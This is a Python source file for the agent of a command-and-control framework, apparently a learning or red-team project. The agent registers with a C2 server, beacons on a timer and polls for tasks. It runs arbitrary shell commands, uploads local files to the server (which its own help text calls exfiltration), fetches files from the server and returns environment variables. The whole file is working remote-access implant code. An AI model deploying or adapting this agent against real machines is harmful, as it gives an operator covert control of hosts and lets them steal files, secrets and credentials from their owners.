"""
C2 Agent — connects to the FastAPI C2 server, registers, sends heartbeats,
polls for commands, executes them, and reports output back.

Usage:
    python agent.py
    python agent.py --server http://192.168.1.100:8000
"""

import os
import sys
import time
import json
import uuid
import socket
import platform
import subprocess
import getpass
import argparse
import threading

import requests

# Add project root to path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from encryption.crypto import encrypt_message, decrypt_message

# ── Configuration ────────────────────────────────────────────────

DEFAULT_SERVER = "http://127.0.0.1:8000"
HEARTBEAT_INTERVAL = 10      # seconds
COMMAND_POLL_INTERVAL = 5    # seconds
ID_FILE = os.path.join(os.path.dirname(__file__), ".agent_id")

# ── Agent ID Persistence ─────────────────────────────────────────

def get_or_create_agent_id() -> str:
    """Load persisted agent ID or generate a new one."""
    if os.path.exists(ID_FILE):
        with open(ID_FILE, "r") as f:
            agent_id = f.read().strip()
            if agent_id:
                return agent_id

    agent_id = str(uuid.uuid4())
    with open(ID_FILE, "w") as f:
        f.write(agent_id)
    return agent_id


# ── System Info ──────────────────────────────────────────────────

def get_system_info() -> dict:
    """Gather detailed system information."""
    hostname = socket.gethostname()
    try:
        ip = socket.gethostbyname(hostname)
    except Exception:
        ip = "unknown"

    return {
        "hostname": hostname,
        "username": getpass.getuser(),
        "os_name": f"{platform.system()} {platform.release()}",
        "ip_address": ip,
        "arch": platform.machine(),
        "processor": platform.processor(),
        "python": platform.python_version(),
    }


# ── Built-in Command Handlers ───────────────────────────────────

def handle_sysinfo() -> str:
    """Return detailed system information."""
    info = get_system_info()
    lines = [f"{k}: {v}" for k, v in info.items()]
    return "\n".join(lines)


def handle_whoami() -> str:
    return f"{getpass.getuser()}@{socket.gethostname()}"


def handle_pwd() -> str:
    return os.getcwd()


def handle_ls(path: str = ".") -> str:
    try:
        entries = os.listdir(path)
        result = []
        for entry in sorted(entries):
            full = os.path.join(path, entry)
            if os.path.isdir(full):
                result.append(f"[DIR]  {entry}")
            else:
                size = os.path.getsize(full)
                result.append(f"[FILE] {entry}  ({size} bytes)")
        return "\n".join(result) if result else "(empty directory)"
    except Exception as e:
        return f"Error: {e}"


def handle_cd(path: str) -> str:
    try:
        os.chdir(path)
        return f"Changed directory to: {os.getcwd()}"
    except Exception as e:
        return f"Error: {e}"


def handle_download(filepath: str, server_url: str, agent_id: str) -> str:
    """Upload a local file TO the server (exfiltration)."""
    try:
        if not os.path.exists(filepath):
            return f"Error: File not found: {filepath}"

        with open(filepath, "rb") as f:
            files = {"file": (os.path.basename(filepath), f)}
            data = {"agent_id": agent_id}
            resp = requests.post(f"{server_url}/upload", files=files, data=data, timeout=30)
            return f"Uploaded: {filepath} -> Server ({resp.json()})"
    except Exception as e:
        return f"Upload error: {e}"


def handle_upload(filename: str, server_url: str) -> str:
    """Download a file FROM the server to local machine."""
    try:
        resp = requests.get(f"{server_url}/download/{filename}", timeout=30)
        if resp.status_code == 200:
            save_path = os.path.join(os.getcwd(), filename)
            with open(save_path, "wb") as f:
                f.write(resp.content)
            return f"Downloaded: {filename} -> {save_path} ({len(resp.content)} bytes)"
        else:
            return f"Download failed: {resp.status_code}"
    except Exception as e:
        return f"Download error: {e}"


def handle_ps() -> str:
    """List running processes."""
    try:
        if platform.system() == "Windows":
            result = subprocess.run(["tasklist"], capture_output=True, text=True, timeout=10)
        else:
            result = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=10)
        return result.stdout[:3000]  # limit output size
    except Exception as e:
        return f"Error: {e}"


def handle_env() -> str:
    """Return environment variables."""
    lines = [f"{k}={v}" for k, v in sorted(os.environ.items())]
    return "\n".join(lines)[:3000]


def handle_net() -> str:
    """Show network info."""
    try:
        if platform.system() == "Windows":
            result = subprocess.run(["ipconfig"], capture_output=True, text=True, timeout=10)
        else:
            result = subprocess.run(["ifconfig"], capture_output=True, text=True, timeout=10)
        return result.stdout[:3000]
    except Exception as e:
        return f"Error: {e}"


def execute_shell(cmd: str) -> str:
    """Execute arbitrary shell command and return output."""
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        output = result.stdout + result.stderr
        return output.strip()[:5000] if output.strip() else "(no output)"
    except subprocess.TimeoutExpired:
        return "Error: Command timed out (30s limit)"
    except Exception as e:
        return f"Error: {e}"


# ── Command Router ───────────────────────────────────────────────

def execute_command(command: str, server_url: str, agent_id: str) -> str:
    """Route a command to the appropriate handler."""
    parts = command.strip().split(maxsplit=1)
    cmd = parts[0].lower()
    arg = parts[1] if len(parts) > 1 else ""

    if cmd == "sysinfo":
        return handle_sysinfo()
    elif cmd == "whoami":
        return handle_whoami()
    elif cmd == "pwd":
        return handle_pwd()
    elif cmd == "ls":
        return handle_ls(arg if arg else ".")
    elif cmd == "cd":
        return handle_cd(arg) if arg else "Usage: cd <path>"
    elif cmd == "download":
        return handle_download(arg, server_url, agent_id) if arg else "Usage: download <filepath>"
    elif cmd == "upload":
        return handle_upload(arg, server_url) if arg else "Usage: upload <filename>"
    elif cmd == "ps":
        return handle_ps()
    elif cmd == "env":
        return handle_env()
    elif cmd == "net":
        return handle_net()
    elif cmd == "help":
        return (
            "Available commands:\n"
            "  sysinfo    - System information\n"
            "  whoami     - Current user@host\n"
            "  pwd        - Current directory\n"
            "  ls [path]  - List directory\n"
            "  cd <path>  - Change directory\n"
            "  ps         - List processes\n"
            "  env        - Environment variables\n"
            "  net        - Network configuration\n"
            "  download <file> - Exfiltrate file to server\n"
            "  upload <file>   - Download file from server\n"
            "  help       - Show this help\n"
            "  exit       - Shutdown agent\n"
            "  <anything else> - Executed as shell command"
        )
    else:
        # Fallback: run as shell command
        return execute_shell(command)


# ── Agent Core ───────────────────────────────────────────────────

class C2Agent:
    def __init__(self, server_url: str):
        self.server_url = server_url.rstrip("/")
        self.agent_id = get_or_create_agent_id()
        self.running = True
        self.sys_info = get_system_info()

        print(f"[*] Agent ID: {self.agent_id}")
        print(f"[*] Server:   {self.server_url}")
        print(f"[*] Host:     {self.sys_info['hostname']}")
        print(f"[*] User:     {self.sys_info['username']}")
        print(f"[*] OS:       {self.sys_info['os_name']}")

    def register(self):
        """Register with the C2 server."""
        payload = {
            "agent_id": self.agent_id,
            "hostname": self.sys_info["hostname"],
            "username": self.sys_info["username"],
            "os_name": self.sys_info["os_name"],
            "ip_address": self.sys_info["ip_address"],
        }

        try:
            resp = requests.post(f"{self.server_url}/register", json=payload, timeout=10)
            print(f"[+] Registered: {resp.json()}")
            return True
        except Exception as e:
            print(f"[-] Registration failed: {e}")
            return False

    def send_heartbeat(self):
        """Send periodic heartbeat to the server."""
        while self.running:
            try:
                requests.post(
                    f"{self.server_url}/heartbeat",
                    json={"agent_id": self.agent_id},
                    timeout=5
                )
            except Exception:
                pass
            time.sleep(HEARTBEAT_INTERVAL)

    def poll_commands(self):
        """Poll server for pending commands and execute them."""
        while self.running:
            try:
                resp = requests.get(
                    f"{self.server_url}/get_command/{self.agent_id}",
                    timeout=10
                )
                data = resp.json()
                command = data.get("command", "")

                if command:
                    print(f"[>] Command received: {command}")

                    if command.strip().lower() == "exit":
                        print("[!] Exit command received. Shutting down...")
                        self.send_output(command, "Agent shutting down.")
                        self.running = False
                        break

                    output = execute_command(command, self.server_url, self.agent_id)
                    print(f"[<] Output: {output[:200]}")

                    self.send_output(command, output)

            except Exception as e:
                print(f"[-] Poll error: {e}")

            time.sleep(COMMAND_POLL_INTERVAL)

    def send_output(self, command: str, output: str):
        """Send command output back to the server."""
        payload = {
            "agent_id": self.agent_id,
            "command": command,
            "output": output
        }
        try:
            requests.post(f"{self.server_url}/send_output", json=payload, timeout=10)
        except Exception as e:
            print(f"[-] Failed to send output: {e}")

    def run(self):
        """Main agent loop with retry logic."""
        retry_delay = 5
        max_delay = 60

        # Registration with retry
        while self.running:
            if self.register():
                break
            print(f"[*] Retrying in {retry_delay}s...")
            time.sleep(retry_delay)
            retry_delay = min(retry_delay * 2, max_delay)

        if not self.running:
            return

        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self.send_heartbeat, daemon=True)
        heartbeat_thread.start()
        print(f"[*] Heartbeat started (every {HEARTBEAT_INTERVAL}s)")

        # Start command polling (main thread)
        print(f"[*] Command polling started (every {COMMAND_POLL_INTERVAL}s)")
        print(f"[*] Agent ready. Waiting for commands...\n")

        try:
            self.poll_commands()
        except KeyboardInterrupt:
            print("\n[!] Agent interrupted by user.")
            self.running = False


# ── Entry Point ──────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="C2 Framework Agent")
    parser.add_argument("--server", default=DEFAULT_SERVER, help="C2 server URL")
    args = parser.parse_args()

    agent = C2Agent(server_url=args.server)
    agent.run()
